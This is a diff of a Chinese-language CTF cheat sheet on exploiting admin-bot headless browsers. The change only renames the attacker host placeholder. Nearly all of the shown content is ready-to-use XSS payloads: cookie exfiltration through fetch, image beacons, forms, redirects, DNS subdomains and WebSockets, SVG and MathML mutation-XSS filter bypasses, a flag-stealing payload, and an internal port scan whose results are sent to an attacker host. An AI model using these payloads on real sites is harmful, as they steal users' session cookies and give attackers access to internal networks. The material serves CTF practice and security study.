@@ -11,26 +11,26 @@ CTF admin bot 本质：**一个 headless 浏览器，带着高权限 cookie/loca
 // 优先级: fetch > image > form > window.location > DNS
 
 // 通道 1: fetch (需 connect-src 允许目标域或 *)
-fetch('https://attacker.com/s?' + document.cookie)
+fetch('https://<attacker-domain>/s?' + document.cookie)
 fetch('https://webhook.site/YOUR-UUID?s=' + btoa(document.cookie))
 
 // 通道 2: Image beacon (img-src 允许)
-new Image().src = 'https://attacker.com/x?' + document.cookie
+new Image().src = 'https://<attacker-domain>/x?' + document.cookie
 
 // 通道 3: Form submit (form-action 允许)
 var f = document.createElement('form'); f.method='POST';
-f.action = 'https://attacker.com/collect';
+f.action = 'https://<attacker-domain>/collect';
 var i = document.createElement('input'); i.name='d'; i.value=document.cookie;
 f.appendChild(i); document.body.appendChild(f); f.submit();
 
 // 通道 4: window.location (无限制 — 但会跳走)
-window.location = 'https://attacker.com/' + document.cookie
+window.location = 'https://<attacker-domain>/' + document.cookie
 
 // 通道 5: DNS (最可靠, 绕过几乎所有 CSP)
-new Image().src = 'https://' + btoa(document.cookie).slice(0,60) + '.attacker.com/x'
+new Image().src = 'https://' + btoa(document.cookie).slice(0,60) + '.<attacker-domain>/x'
 
 // 通道 6: WebSocket (connect-src ws:)
-var ws = new WebSocket('wss://attacker.com/leak');
+var ws = new WebSocket('wss://<attacker-domain>/leak');
 ws.onopen = function() { ws.send(document.cookie); };
 ```
 
@@ -84,12 +84,12 @@ for (var k of clobbered) {
 <!-- 如果 HTML 标签被过滤，尝试 SVG namespace -->
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>/* 可能绕过仅匹配 HTML namespace 的过滤器 */</script>
-  <animate onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" dur="1s"/>
-  <set onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" to="1"/>
+  <animate onbegin="fetch('https://<attacker-domain>/'+document.cookie)" attributeName="x" dur="1s"/>
+  <set onbegin="fetch('https://<attacker-domain>/'+document.cookie)" attributeName="x" to="1"/>
 </svg>
 
 <!-- MathML 类似 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>-->
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('https://<attacker-domain>/'+document.cookie)>-->
 ```
 
 ## Sanitizer 绕过
@@ -142,7 +142,7 @@ def build_exploit_url(payload_js: str, callback_url: str) -> str:
     # return f"https://target.com/profile/attacker"
 
     # 方式 3: 直接可控页面
-    # return f"https://attacker.com/exploit.html"
+    # return f"https://<attacker-domain>/exploit.html"
 ```
 
 ## 通过 admin bot 打内网
@@ -158,7 +158,7 @@ async function scan_internal() {
             results.push(`port ${port}: open`);
         } catch(e) {}
     }
-    fetch('https://attacker.com/r?' + JSON.stringify(results));
+    fetch('https://<attacker-domain>/r?' + JSON.stringify(results));
 }
 ```
 
@@ -207,7 +207,7 @@ XSS → Service Worker → 持久化中间人 → 全站劫持
 
 ```html
 <!-- Mutation XSS — 过滤后 DOM 和渲染后 DOM 不同 -->
-<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//attacker.com/'+btoa(t))>-->
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//<attacker-domain>/'+btoa(t))>-->
 
 <!-- Namespace confusion — SVG 内的 HTML 被不同解析 -->
 <svg><foreignObject><div id="x"></div></foreignObject></svg>
